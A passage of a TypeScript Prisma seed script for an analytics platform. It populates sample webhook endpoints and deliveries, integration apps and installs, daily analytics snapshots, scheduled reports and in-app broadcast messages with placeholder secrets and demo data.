        scopes: ['read:audiences', 'read:insights'],
        ipWhitelist: ['10.0.0.0/8'],
        lastUsed: new Date(now.getTime() - 2 * 60 * 60 * 1000),
        requestCount: 45678,
        createdBy: adminUser.id,
      },
    ]
  })

  // ==================== WEBHOOK ENDPOINTS ====================
  console.log('🔗 Creating webhook endpoints...')

  // Declare webhook variables outside the safeSeedSection so they can be used later
  let webhook1: { id: string } | null = null
  let webhook2: { id: string } | null = null
  let webhook3: { id: string } | null = null
  let webhook4: { id: string } | null = null
  let webhook5: { id: string } | null = null

  await safeSeedSection('WebhookEndpoint', async () => {
    webhook1 = await prisma.webhookEndpoint.create({
      data: {
        orgId: enterpriseCo.id,
        name: 'Slack Notifications',
        url: 'https://hooks.slack.com/services/YOUR_WEBHOOK_URL',
        status: 'ACTIVE',
        events: ['report.completed', 'insight.generated', 'export.ready'],
        secret: 'whsec_enterprise_slack_abc123',
        retryPolicy: { maxRetries: 3, backoffMultiplier: 2 },
        totalDeliveries: 15678,
        successfulDeliveries: 15550,
        failedDeliveries: 128,
        lastDeliveryAt: new Date(now.getTime() - 30 * 60 * 1000),
        createdBy: sarahEnterprise.id,
      }
    })

    webhook2 = await prisma.webhookEndpoint.create({
      data: {
        orgId: enterpriseCo.id,
        name: 'Data Pipeline Trigger',
        url: 'https://pipeline.enterprise-co.com/webhooks/gwi',
        status: 'ACTIVE',
        events: ['audience.updated', 'datasource.synced', 'agent.completed'],
        secret: 'whsec_enterprise_pipeline_def456',
        retryPolicy: { maxRetries: 5, backoffMultiplier: 2 },
        totalDeliveries: 45678,
        successfulDeliveries: 44993,
        failedDeliveries: 685,
        lastDeliveryAt: new Date(now.getTime() - 15 * 60 * 1000),
        createdBy: sarahEnterprise.id,
      }
    })

    webhook3 = await prisma.webhookEndpoint.create({
      data: {
        orgId: acmeCorp.id,
        name: 'Internal Event Handler',
        url: 'https://api.acme.com/webhooks/gwi-events',
        status: 'ACTIVE',
        events: ['*'],
        secret: 'whsec_acme_events_ghi789',
        totalDeliveries: 23456,
        successfulDeliveries: 22939,
        failedDeliveries: 517,
        lastDeliveryAt: new Date(now.getTime() - 2 * 60 * 60 * 1000),
        createdBy: adminUser.id,
      }
    })

    webhook4 = await prisma.webhookEndpoint.create({
      data: {
        orgId: acmeCorp.id,
        name: 'Zapier Integration',
        url: 'https://hooks.zapier.com/hooks/catch/12345/abcdef/',
        status: 'ACTIVE',
        events: ['report.completed', 'export.ready'],
        secret: 'whsec_acme_zapier_jkl012',
        totalDeliveries: 5678,
        successfulDeliveries: 5672,
        failedDeliveries: 6,
        lastDeliveryAt: new Date(now.getTime() - 4 * 60 * 60 * 1000),
        createdBy: janeSmith.id,
      }
    })

    webhook5 = await prisma.webhookEndpoint.create({
      data: {
        orgId: techStartup.id,
        name: 'Analytics Processor',
        url: 'https://analytics.techstartup.io/webhook',
        status: 'FAILED',
        events: ['insight.generated', 'agent.completed'],
        secret: 'whsec_startup_analytics_mno345',
        isHealthy: false,
        consecutiveFailures: 5,
        totalDeliveries: 890,
        successfulDeliveries: 402,
        failedDeliveries: 488,
        lastDeliveryAt: new Date(now.getTime() - 6 * 60 * 60 * 1000),
        createdBy: bobWilson.id,
      }
    })

    await prisma.webhookEndpoint.createMany({
      data: [
        {
          orgId: enterpriseCo.id,
          name: 'Security Alerts',
          url: 'https://siem.enterprise-co.com/api/gwi-alerts',
          status: 'ACTIVE',
          events: ['security.violation', 'user.suspicious_activity'],
          secret: 'whsec_enterprise_security_pqr678',
          totalDeliveries: 234,
          successfulDeliveries: 234,
          failedDeliveries: 0,
          createdBy: sarahEnterprise.id,
        },
        {
          orgId: acmeCorp.id,
          name: 'Disabled Legacy Webhook',
          url: 'https://old-api.acme.com/webhook',
          status: 'DISABLED',
          events: ['report.completed'],
          secret: 'whsec_acme_legacy_stu901',
          totalDeliveries: 12345,
          successfulDeliveries: 12000,
          failedDeliveries: 345,
          disabledAt: new Date(now.getTime() - 60 * 24 * 60 * 60 * 1000),
          disabledReason: 'Endpoint deprecated - migrated to new system',
          createdBy: adminUser.id,
        },
        // Additional webhooks to reach 10
        {
          orgId: globalMediaOrg.id,
          name: 'Global Media Event Processor',
          url: 'https://events.globalmedia.com/webhooks/gwi',
          status: 'ACTIVE',
          events: ['report.completed', 'insight.generated', 'audience.updated'],
          secret: 'whsec_globalmedia_events_001',
          totalDeliveries: 34567,
          successfulDeliveries: 34200,
          failedDeliveries: 367,
          lastDeliveryAt: new Date(now.getTime() - 1 * 60 * 60 * 1000),
          createdBy: adminUser.id,
        },
        {
          orgId: healthTechOrg.id,
          name: 'HealthTech Compliance Logger',
          url: 'https://compliance.healthtech-innovations.com/audit-webhook',
          status: 'ACTIVE',
          events: ['data.accessed', 'export.completed', 'user.activity'],
          secret: 'whsec_healthtech_audit_001',
          retryPolicy: { maxRetries: 5, backoffMultiplier: 2 },
          totalDeliveries: 12345,
          successfulDeliveries: 12345,
          failedDeliveries: 0,
          lastDeliveryAt: new Date(now.getTime() - 30 * 60 * 1000),
          createdBy: adminUser.id,
        },
        {
          orgId: retailGiantOrg.id,
          name: 'Retail Analytics Webhook',
          url: 'https://analytics.retail-giant.com/gwi-events',
          status: 'TESTING',
          events: ['insight.generated', 'report.completed'],
          secret: 'whsec_retail_analytics_001',
          totalDeliveries: 150,
          successfulDeliveries: 145,
          failedDeliveries: 5,
          createdBy: adminUser.id,
        },
      ]
    })
  })

  // ==================== WEBHOOK DELIVERIES ====================
  console.log('📬 Creating webhook deliveries...')

  // Only seed webhook deliveries if webhooks were created
  if (webhook1 && webhook2 && webhook3 && webhook4 && webhook5) {
    await safeSeedSection('WebhookDelivery', async () => {
      await prisma.webhookDelivery.createMany({
        data: [
          { webhookId: webhook1!.id, eventType: 'report.completed', status: 'DELIVERED', payload: { reportId: 'rpt_001', name: 'Q4 Analysis' }, httpStatus: 200, response: '{"ok":true}', attempts: 1, deliveredAt: new Date(now.getTime() - 30 * 60 * 1000) },
          { webhookId: webhook1!.id, eventType: 'insight.generated', status: 'DELIVERED', payload: { insightId: 'ins_001', type: 'trend' }, httpStatus: 200, response: '{"ok":true}', attempts: 1, deliveredAt: new Date(now.getTime() - 2 * 60 * 60 * 1000) },
          { webhookId: webhook2!.id, eventType: 'audience.updated', status: 'DELIVERED', payload: { audienceId: 'aud_001', changes: ['criteria'] }, httpStatus: 200, attempts: 1, deliveredAt: new Date(now.getTime() - 15 * 60 * 1000) },
          { webhookId: webhook2!.id, eventType: 'agent.completed', status: 'DELIVERED', payload: { agentId: 'agent_001', status: 'success' }, httpStatus: 200, attempts: 1, deliveredAt: new Date(now.getTime() - 1 * 60 * 60 * 1000) },
          { webhookId: webhook3!.id, eventType: 'export.ready', status: 'DELIVERED', payload: { exportId: 'exp_001', url: 'https://...' }, httpStatus: 200, attempts: 1, deliveredAt: new Date(now.getTime() - 2 * 60 * 60 * 1000) },
          { webhookId: webhook3!.id, eventType: 'report.completed', status: 'FAILED', payload: { reportId: 'rpt_002' }, httpStatus: 500, response: '{"error":"Internal server error"}', attempts: 3, error: 'Max retries exceeded' },
          { webhookId: webhook4!.id, eventType: 'report.completed', status: 'DELIVERED', payload: { reportId: 'rpt_003' }, httpStatus: 200, attempts: 1, deliveredAt: new Date(now.getTime() - 4 * 60 * 60 * 1000) },
          { webhookId: webhook5!.id, eventType: 'insight.generated', status: 'FAILED', payload: { insightId: 'ins_002' }, attempts: 3, error: 'Connection refused: ECONNREFUSED' },
          { webhookId: webhook5!.id, eventType: 'agent.completed', status: 'PENDING', payload: { agentId: 'agent_002' }, attempts: 1, nextRetryAt: new Date(now.getTime() + 5 * 60 * 1000) },
          { webhookId: webhook1!.id, eventType: 'export.ready', status: 'DELIVERED', payload: { exportId: 'exp_002' }, httpStatus: 200, attempts: 1, deliveredAt: new Date(now.getTime() - 45 * 60 * 1000) },
        ]
      })
    })
  } else {
    console.log('⚠️  Skipping WebhookDelivery - webhook endpoints not created')
  }

  // ==================== INTEGRATION APPS ====================
  console.log('🧩 Creating integration apps...')

  const slackApp = await prisma.integrationApp.create({
    data: {
      name: 'Slack',
      slug: 'slack',
      description: 'Send insights and reports directly to Slack channels. Get real-time notifications for important events.',
      shortDescription: 'Team communication and notifications',
      category: 'COMMUNICATION',
      developer: 'GWI',
      developerUrl: 'https://gwi.com',
      iconUrl: 'https://cdn.gwi.com/integrations/slack-logo.png',
      status: 'PUBLISHED',
      requiredScopes: ['read:reports', 'read:insights', 'webhooks:send'],
      setupInstructions: 'Click Install and authorize GWI to access your Slack workspace.',
      supportUrl: 'https://support.gwi.com/slack',
      isOfficial: true,
      installCount: 456,
      rating: 4.8,
      reviewCount: 89,
      metadata: { version: '2.1.0', features: ['Real-time notifications', 'Channel integration', 'Slash commands', 'Interactive messages'], documentationUrl: 'https://docs.gwi.com/integrations/slack' },
    }
  })

  const salesforceApp = await prisma.integrationApp.create({
    data: {
      name: 'Salesforce',
      slug: 'salesforce',
      description: 'Sync audience insights with Salesforce CRM. Enrich customer profiles with GWI data.',
      shortDescription: 'CRM integration and data sync',
      category: 'CRM',
      developer: 'GWI',
      developerUrl: 'https://gwi.com',
      iconUrl: 'https://cdn.gwi.com/integrations/salesforce-logo.png',
      status: 'PUBLISHED',
      requiredScopes: ['read:audiences', 'read:insights', 'write:exports'],
      isOfficial: true,
      installCount: 234,
      rating: 4.5,
      reviewCount: 45,
      metadata: { version: '1.5.0', features: ['Contact enrichment', 'Custom field mapping', 'Bi-directional sync', 'Automated workflows'], documentationUrl: 'https://docs.gwi.com/integrations/salesforce' },
    }
  })

  const tableauApp = await prisma.integrationApp.create({
    data: {
      name: 'Tableau',
      slug: 'tableau',
      description: 'Connect GWI data to Tableau for advanced visualization and business intelligence.',
      shortDescription: 'Data visualization connector',
      category: 'ANALYTICS',
      developer: 'GWI',
      developerUrl: 'https://gwi.com',
      iconUrl: 'https://cdn.gwi.com/integrations/tableau-logo.png',
      status: 'PUBLISHED',
      requiredScopes: ['read:audiences', 'read:crosstabs', 'read:analytics'],
      isOfficial: true,
      installCount: 178,
      rating: 4.6,
      reviewCount: 34,
      metadata: { version: '1.2.0', features: ['Web Data Connector', 'Live data connection', 'Custom extracts', 'Dashboard embedding'], documentationUrl: 'https://docs.gwi.com/integrations/tableau' },
    }
  })

  await prisma.integrationApp.createMany({
    data: [
      {
        name: 'Microsoft Teams',
        slug: 'microsoft-teams',
        description: 'Integrate GWI with Microsoft Teams for seamless collaboration and notifications.',
        shortDescription: 'Team collaboration and alerts',
        category: 'COMMUNICATION',
        developer: 'GWI',
        iconUrl: 'https://cdn.gwi.com/integrations/teams-logo.png',
        status: 'PUBLISHED',
        requiredScopes: ['read:reports', 'webhooks:send'],
        isOfficial: true,
        installCount: 123,
        rating: 4.3,
        reviewCount: 18,
        metadata: { version: '1.0.0', features: ['Channel notifications', 'Adaptive cards', 'Bot commands'] },
      },
      {
        name: 'HubSpot',
        slug: 'hubspot',
        description: 'Sync GWI audience data with HubSpot for enriched marketing campaigns.',
        shortDescription: 'Marketing automation sync',
        category: 'MARKETING',
        developer: 'GWI',
        iconUrl: 'https://cdn.gwi.com/integrations/hubspot-logo.png',
        status: 'PUBLISHED',
        requiredScopes: ['read:audiences', 'write:exports'],
        isOfficial: true,
        installCount: 167,
        rating: 4.4,
        reviewCount: 28,
        metadata: { version: '1.3.0', features: ['Contact enrichment', 'List sync', 'Custom properties'] },
      },
      {
        name: 'Google BigQuery',
        slug: 'google-bigquery',
        description: 'Export GWI data directly to Google BigQuery for advanced analytics.',
        shortDescription: 'Data warehouse export',
        category: 'ANALYTICS',
        developer: 'GWI',
        iconUrl: 'https://cdn.gwi.com/integrations/bigquery-logo.png',
        status: 'PUBLISHED',
        requiredScopes: ['read:*', 'write:exports'],
        isOfficial: true,
        installCount: 89,
        rating: 4.7,
        reviewCount: 15,
        metadata: { version: '2.0.0', features: ['Scheduled exports', 'Custom schemas', 'Incremental sync'] },
      },
      {
        name: 'Snowflake',
        slug: 'snowflake',
        description: 'Connect GWI to Snowflake for enterprise data warehousing.',
        shortDescription: 'Cloud data warehouse',
        category: 'ANALYTICS',
        developer: 'GWI',
        iconUrl: 'https://cdn.gwi.com/integrations/snowflake-logo.png',
        status: 'PUBLISHED',
        requiredScopes: ['read:*', 'write:exports'],
        isOfficial: true,
        installCount: 67,
        rating: 4.8,
        reviewCount: 12,
        metadata: { version: '1.1.0', features: ['Data sharing', 'Secure views', 'Real-time sync'] },
      },
      {
        name: 'Zapier',
        slug: 'zapier',
        description: 'Connect GWI to 5000+ apps through Zapier automation.',
        shortDescription: 'Workflow automation',
        category: 'PRODUCTIVITY',
        developer: 'GWI',
        iconUrl: 'https://cdn.gwi.com/integrations/zapier-logo.png',
        status: 'PUBLISHED',
        requiredScopes: ['read:reports', 'read:exports', 'webhooks:receive'],
        isOfficial: true,
        installCount: 345,
        rating: 4.5,
        reviewCount: 67,
        metadata: { version: '1.4.0', features: ['Triggers', 'Actions', 'Multi-step Zaps'] },
      },
      {
        name: 'Power BI',
        slug: 'power-bi',
        description: 'Microsoft Power BI connector for GWI data visualization.',
        shortDescription: 'Business intelligence',
        category: 'ANALYTICS',
        developer: 'GWI',
        iconUrl: 'https://cdn.gwi.com/integrations/powerbi-logo.png',
        status: 'PUBLISHED',
        requiredScopes: ['read:audiences', 'read:crosstabs'],
        isOfficial: true,
        installCount: 145,
        rating: 4.4,
        reviewCount: 23,
        metadata: { version: '1.0.0', features: ['DirectQuery', 'Scheduled refresh', 'Custom visuals'] },
      },
      {
        name: 'Marketo',
        slug: 'marketo',
        description: 'Enrich Marketo leads with GWI audience insights.',
        shortDescription: 'Marketing automation',
        category: 'MARKETING',
        developer: 'Partner Solutions Inc',
        developerUrl: 'https://partnersolutions.com',
        iconUrl: 'https://cdn.gwi.com/integrations/marketo-logo.png',
        status: 'PUBLISHED',
        requiredScopes: ['read:audiences'],
        isOfficial: false,
        installCount: 34,
        rating: 4.1,
        reviewCount: 8,
        metadata: { version: '0.9.0', features: ['Lead enrichment', 'Segment sync'] },
      },
      {
        name: 'Custom Webhook',
        slug: 'custom-webhook',
        description: 'Send GWI events to any webhook endpoint.',
        shortDescription: 'Custom integrations',
        category: 'DEVELOPER_TOOLS',
        developer: 'GWI',
        iconUrl: 'https://cdn.gwi.com/integrations/webhook-logo.png',
        status: 'PUBLISHED',
        requiredScopes: ['webhooks:send'],
        isOfficial: true,
        installCount: 567,
        rating: 4.6,
        reviewCount: 45,
        metadata: { version: '1.0.0', features: ['Custom events', 'Retry logic', 'HMAC signing'] },
      },
      {
        name: 'AWS S3 Export',
        slug: 'aws-s3',
        description: 'Export GWI data directly to Amazon S3 buckets.',
        shortDescription: 'Cloud storage export',
        category: 'ANALYTICS',
        developer: 'GWI',
        iconUrl: 'https://cdn.gwi.com/integrations/s3-logo.png',
        status: 'DRAFT',
        requiredScopes: ['read:*', 'write:exports'],
        isOfficial: true,
        installCount: 23,
        rating: 4.2,
        reviewCount: 5,
        metadata: { version: '0.5.0', features: ['Scheduled exports', 'Multiple formats', 'Cross-account access'], isBeta: true },
      },
      {
        name: 'Looker Studio',
        slug: 'looker-studio',
        description: 'Google Looker Studio connector for GWI data.',
        shortDescription: 'Data visualization',
        category: 'ANALYTICS',
        developer: 'GWI',
        iconUrl: 'https://cdn.gwi.com/integrations/looker-logo.png',
        status: 'DRAFT',
        requiredScopes: ['read:audiences', 'read:analytics'],
        isOfficial: true,
        installCount: 0,
        metadata: { version: '0.1.0', features: ['Community connector', 'Custom dimensions'], comingSoon: true },
      },
    ]
  })

  // ==================== INTEGRATION INSTALLS ====================
  console.log('📦 Creating integration installs...')

  await prisma.integrationInstall.createMany({
    data: [
      { appId: slackApp.id, orgId: enterpriseCo.id, status: 'ACTIVE', configuration: { channel: '#gwi-insights', notifyOn: ['reports', 'insights'] }, installedBy: sarahEnterprise.id, lastUsedAt: new Date(now.getTime() - 1 * 60 * 60 * 1000) },
      { appId: slackApp.id, orgId: acmeCorp.id, status: 'ACTIVE', configuration: { channel: '#analytics', notifyOn: ['reports'] }, installedBy: adminUser.id, lastUsedAt: new Date(now.getTime() - 4 * 60 * 60 * 1000) },
      { appId: salesforceApp.id, orgId: enterpriseCo.id, status: 'ACTIVE', configuration: { objectType: 'Contact', fieldMapping: { email: 'Email', segment: 'GWI_Segment__c' } }, installedBy: sarahEnterprise.id, lastUsedAt: new Date(now.getTime() - 24 * 60 * 60 * 1000) },
      { appId: tableauApp.id, orgId: enterpriseCo.id, status: 'ACTIVE', configuration: { server: 'https://tableau.enterprise-co.com' }, installedBy: sarahEnterprise.id, lastUsedAt: new Date(now.getTime() - 2 * 24 * 60 * 60 * 1000) },
      { appId: tableauApp.id, orgId: acmeCorp.id, status: 'ACTIVE', configuration: { server: 'https://tableau.acme.com' }, installedBy: janeSmith.id, lastUsedAt: new Date(now.getTime() - 12 * 60 * 60 * 1000) },
      { appId: slackApp.id, orgId: techStartup.id, status: 'PAUSED', configuration: { channel: '#data' }, installedBy: bobWilson.id, metadata: { suspendedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000).toISOString(), suspendReason: 'Slack workspace disconnected' } },
      { appId: salesforceApp.id, orgId: acmeCorp.id, status: 'ACTIVE', configuration: { objectType: 'Lead' }, installedBy: adminUser.id, lastUsedAt: new Date(now.getTime() - 48 * 60 * 60 * 1000) },
    ]
  })

  // ==================== ANALYTICS SNAPSHOTS ====================
  console.log('📈 Creating analytics snapshots...')

  const analyticsSnapshots = []
  for (let i = 0; i < 30; i++) {
    const snapshotDate = new Date(now.getTime() - i * 24 * 60 * 60 * 1000)
    const baseUsers = 2500 + Math.floor(Math.random() * 200) - 100
    const baseOrgs = 156 + Math.floor(Math.random() * 10)

    analyticsSnapshots.push({
      snapshotDate,
      period: 'DAILY',
      metrics: {
        totalUsers: baseUsers + i * 3,
        activeUsers: Math.floor(baseUsers * 0.65) + Math.floor(Math.random() * 50),
        newUsers: 15 + Math.floor(Math.random() * 10),
        totalOrgs: baseOrgs,
        activeOrgs: Math.floor(baseOrgs * 0.78),
        newOrgs: Math.floor(Math.random() * 3),
        totalAgentRuns: 45000 + Math.floor(Math.random() * 5000),
        totalApiCalls: 1500000 + Math.floor(Math.random() * 200000),
        totalDataExports: 890 + Math.floor(Math.random() * 100),
        totalReportsGenerated: 2300 + Math.floor(Math.random() * 300),
        avgSessionDuration: 25 + Math.random() * 10,
        avgAgentRunTime: 12 + Math.random() * 5,
      },
      usersByPlan: { STARTER: 890, PROFESSIONAL: 1200, ENTERPRISE: baseUsers - 2090 },
      usersByRegion: { 'North America': 1200, 'Europe': 800, 'Asia Pacific': 350, 'Other': 150 },
      topFeatures: [
        { feature: 'Audience Builder', usage: 45000 + Math.floor(Math.random() * 5000) },
        { feature: 'Crosstab Analysis', usage: 38000 + Math.floor(Math.random() * 4000) },
        { feature: 'AI Insights', usage: 28000 + Math.floor(Math.random() * 3000) },
        { feature: 'Report Generator', usage: 22000 + Math.floor(Math.random() * 2500) },
        { feature: 'Dashboard Builder', usage: 18000 + Math.floor(Math.random() * 2000) },
      ],
      errorRate: 0.02 + Math.random() * 0.01,
      p99Latency: 180 + Math.floor(Math.random() * 50),
    })
  }

  await prisma.analyticsSnapshot.createMany({ data: analyticsSnapshots })

  // ==================== CUSTOM REPORTS ====================
  console.log('📑 Creating custom reports...')

  await prisma.customReport.createMany({
    data: [
      {
        name: 'Monthly Executive Summary',
        description: 'High-level platform metrics for executive review',
        type: 'SCHEDULED',
        schedule: '0 9 1 * *',
        config: {
          metrics: ['totalUsers', 'activeUsers', 'revenue', 'churnRate'],
          groupBy: 'plan',
          dateRange: 'last_30_days',
          format: 'pdf',
        },
        recipients: ['executives@gwi.com', 'leadership@gwi.com'],
        lastRunAt: new Date(now.getTime() - 13 * 24 * 60 * 60 * 1000),
        nextRunAt: new Date(now.getTime() + 17 * 24 * 60 * 60 * 1000),
        status: 'OPEN',
        createdBy: superAdmin?.id || 'system',
      },
      {
        name: 'Weekly Churn Analysis',
        description: 'Detailed analysis of at-risk accounts and churn indicators',
        type: 'SCHEDULED',
        schedule: '0 8 * * 1',
        config: {
          metrics: ['churnProbability', 'healthScore', 'lastActivity'],
          filters: { riskLevel: ['AT_RISK', 'CRITICAL'] },
          format: 'xlsx',
        },
        recipients: ['customer-success@gwi.com'],
        lastRunAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
        nextRunAt: new Date(now.getTime() + 2 * 24 * 60 * 60 * 1000),
        status: 'OPEN',
        createdBy: platformAdmin?.id || 'system',
      },
      {
        name: 'Security Incident Report',
        description: 'Summary of security events and policy violations',
        type: 'SCHEDULED',
        schedule: '0 6 * * *',
        config: {
          metrics: ['securityViolations', 'threatEvents', 'blockedIPs'],
          severity: ['HIGH', 'CRITICAL'],
          format: 'pdf',
        },
        recipients: ['security@gwi.com', 'compliance@gwi.com'],
        lastRunAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
        nextRunAt: new Date(now.getTime() + 6 * 60 * 60 * 1000),
        status: 'OPEN',
        createdBy: superAdmin?.id || 'system',
      },
      {
        name: 'API Usage Dashboard',
        description: 'Real-time API usage metrics and trends',
        type: 'REALTIME',
        config: {
          metrics: ['apiCalls', 'errorRate', 'latency', 'activeClients'],
          refreshInterval: 60,
          alerts: { errorRate: 0.05, latency: 500 },
        },
        status: 'OPEN',
        createdBy: platformAdmin?.id || 'system',
      },
      {
        name: 'Compliance Audit Summary',
        description: 'Monthly compliance status across all frameworks',
        type: 'SCHEDULED',
        schedule: '0 10 1 * *',
        config: {
          frameworks: ['SOC2', 'GDPR', 'HIPAA', 'ISO27001'],
          includeEvidence: true,
          format: 'pdf',
        },
        recipients: ['compliance@gwi.com', 'legal@gwi.com'],
        lastRunAt: new Date(now.getTime() - 13 * 24 * 60 * 60 * 1000),
        nextRunAt: new Date(now.getTime() + 17 * 24 * 60 * 60 * 1000),
        status: 'OPEN',
        createdBy: superAdmin?.id || 'system',
      },
      {
        name: 'Feature Adoption Report',
        description: 'Analysis of feature usage and adoption trends',
        type: 'ON_DEMAND',
        config: {
          metrics: ['featureUsage', 'adoptionRate', 'userSegments'],
          comparison: 'month_over_month',
          format: 'xlsx',
        },
        lastRunAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
        status: 'OPEN',
        createdBy: platformAdmin?.id || 'system',
      },
      {
        name: 'Revenue Analytics',
        description: 'Detailed revenue breakdown by plan and region',
        type: 'SCHEDULED',
        schedule: '0 7 * * 1',
        config: {
          metrics: ['mrr', 'arr', 'expansion', 'contraction'],
          groupBy: ['plan', 'region'],
          format: 'pdf',
        },
        recipients: ['finance@gwi.com'],
        lastRunAt: new Date(now.getTime() - 5 * 24 * 60 * 60 * 1000),
        nextRunAt: new Date(now.getTime() + 2 * 24 * 60 * 60 * 1000),
        status: 'OPEN',
        createdBy: superAdmin?.id || 'system',
      },
      {
        name: 'Deprecated Report',
        description: 'Old report format - no longer in use',
        type: 'SCHEDULED',
        schedule: '0 0 1 * *',
        config: { legacy: true },
        status: 'DISABLED',
        createdBy: platformAdmin?.id || 'system',
      },
    ]
  })

  // ==================== BROADCAST MESSAGES ====================
  console.log('📢 Creating broadcast messages...')

  await prisma.broadcastMessage.createMany({
    data: [
      {
        title: 'Platform Update: Version 2.5.0 Released',
        content: 'We are excited to announce the release of version 2.5.0, featuring new Security Center capabilities, compliance framework tracking, and significant performance improvements. Check out the changelog for full details.',
        type: 'ANNOUNCEMENT',
        priority: 'NORMAL',
        status: 'PUBLISHED',
        targetAudience: 'ALL',
        channels: ['IN_APP', 'EMAIL'],
        publishedAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() + 23 * 24 * 60 * 60 * 1000),
        createdBy: superAdmin?.id || 'system',
        stats: { views: 2345, clicks: 567, dismissals: 123 },
      },
      {
        title: 'Scheduled Maintenance: Database Upgrade',
        content: 'We will be performing scheduled maintenance on January 18th from 2:00 AM to 6:00 AM UTC. During this time, the platform will be unavailable. Please plan accordingly.',
        type: 'MAINTENANCE',
        priority: 'HIGH',
        status: 'SCHEDULED',
        targetAudience: 'ALL',
        channels: ['IN_APP', 'EMAIL', 'SMS'],
        scheduledFor: new Date(now.getTime() + 5 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() + 6 * 24 * 60 * 60 * 1000),
        createdBy: superAdmin?.id || 'system',
      },
      {
        title: 'Security Alert: Phishing Campaign Detected',
        content: 'We have detected a phishing campaign targeting GWI users. Please be vigilant and do not click on suspicious links. Always verify the sender before entering credentials. Report suspicious emails to security@gwi.com.',
        type: 'ALERT',
        priority: 'URGENT',
        status: 'PUBLISHED',
        targetAudience: 'ALL',
        channels: ['IN_APP', 'EMAIL'],
        publishedAt: new Date(now.getTime() - 1 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() + 6 * 24 * 60 * 60 * 1000),
        createdBy: superAdmin?.id || 'system',
        stats: { views: 1890, clicks: 234, dismissals: 45 },
      },
      {
        title: 'New Feature: AI Insights V2 Now Available',
        content: 'AI Insights V2 is now available for Professional and Enterprise plans! Experience deeper analysis, trend predictions, and automated recommendations. Enable it in your account settings.',
        type: 'FEATURE',
        priority: 'NORMAL',
        status: 'PUBLISHED',
        targetAudience: 'PLAN',
        targetPlans: ['PROFESSIONAL', 'ENTERPRISE'],
        channels: ['IN_APP'],
        publishedAt: new Date(now.getTime() - 14 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() + 16 * 24 * 60 * 60 * 1000),
        createdBy: platformAdmin?.id || 'system',
        stats: { views: 890, clicks: 345, dismissals: 67 },
      },
      {
        title: 'Special Offer: 20% Off Enterprise Plan',
        content: 'For a limited time, upgrade to Enterprise and get 20% off your first year. Unlock SSO, advanced permissions, unlimited API access, and priority support. Contact sales to learn more.',
        type: 'PROMOTION',
        priority: 'NORMAL',
        status: 'PUBLISHED',
        targetAudience: 'PLAN',
        targetPlans: ['STARTER', 'PROFESSIONAL'],
        channels: ['IN_APP', 'EMAIL'],
        publishedAt: new Date(now.getTime() - 10 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() + 20 * 24 * 60 * 60 * 1000),
        createdBy: platformAdmin?.id || 'system',
        stats: { views: 1234, clicks: 189, dismissals: 456 },
      },
      {
        title: 'API Deprecation Notice: v1 Endpoints',
        content: 'API v1 endpoints will be deprecated on March 1st, 2025. Please migrate to v2 API. Comprehensive migration guides are available in our documentation.',
        type: 'WARNING',
        priority: 'HIGH',
        status: 'PUBLISHED',
        targetAudience: 'ALL',
        channels: ['IN_APP', 'EMAIL'],
        publishedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000),
        expiresAt: new Date('2025-03-01'),
        createdBy: superAdmin?.id || 'system',
        stats: { views: 3456, clicks: 789, dismissals: 234 },
      },
      {
        title: 'Webinar: Getting the Most Out of GWI',
        content: 'Join us for a live webinar on advanced GWI features. Learn tips and tricks from our product experts. Register now!',
        type: 'ANNOUNCEMENT',
        priority: 'LOW',
        status: 'PUBLISHED',
        targetAudience: 'ALL',
        channels: ['IN_APP'],
        publishedAt: new Date(now.getTime() - 3 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() + 4 * 24 * 60 * 60 * 1000),
        actionUrl: 'https://gwi.com/webinars/advanced-features',
        actionText: 'Register Now',
        createdBy: platformAdmin?.id || 'system',
        stats: { views: 567, clicks: 123, dismissals: 89 },
      },
      {
        title: 'System Performance Improvement',
        content: 'We have completed infrastructure upgrades that improve platform performance by up to 40%. Enjoy faster load times and improved reliability.',
        type: 'ANNOUNCEMENT',
        priority: 'NORMAL',
        status: 'PUBLISHED',
        targetAudience: 'ALL',
        channels: ['IN_APP'],
        publishedAt: new Date(now.getTime() - 21 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() - 7 * 24 * 60 * 60 * 1000),
        createdBy: superAdmin?.id || 'system',
        stats: { views: 4567, clicks: 0, dismissals: 890 },
      },
      {
        title: 'Draft: Q1 Product Updates',
        content: 'Preview of upcoming Q1 product updates including new dashboard features and enhanced reporting capabilities.',
        type: 'ANNOUNCEMENT',
        priority: 'NORMAL',
        status: 'DRAFT',
        targetAudience: 'ALL',
        channels: ['IN_APP', 'EMAIL'],
        createdBy: platformAdmin?.id || 'system',
      },
      {
        title: 'Enterprise SSO Maintenance',
        content: 'Enterprise SSO will undergo brief maintenance on January 20th at 3:00 AM UTC. Users may need to re-authenticate after maintenance.',
        type: 'MAINTENANCE',
        priority: 'NORMAL',
        status: 'SCHEDULED',
        targetAudience: 'PLAN',
        targetPlans: ['ENTERPRISE'],
        channels: ['IN_APP', 'EMAIL'],
        scheduledFor: new Date(now.getTime() + 7 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() + 8 * 24 * 60 * 60 * 1000),
        createdBy: superAdmin?.id || 'system',
      },
      {
        title: 'Holiday Support Hours',
        content: 'Please note that support hours will be limited during the holiday period. Emergency support remains available 24/7.',
        type: 'ANNOUNCEMENT',
        priority: 'LOW',
        status: 'EXPIRED',
        targetAudience: 'ALL',
        channels: ['IN_APP'],
        publishedAt: new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000),
        expiresAt: new Date(now.getTime() - 15 * 24 * 60 * 60 * 1000),
        createdBy: platformAdmin?.id || 'system',
        stats: { views: 2345, clicks: 0, dismissals: 567 },
      },
    ]
  })

  // ==================== ORGANIZATION RELATIONSHIPS ====================
  console.log('🔗 Creating organization relationships...')

  await safeSeedSection('Organization Relationships', async () => {
    // Agency-Client relationship
    await prisma.orgRelationship.create({
      data: {
        fromOrgId: enterpriseCo.id,
        toOrgId: acmeCorp.id,
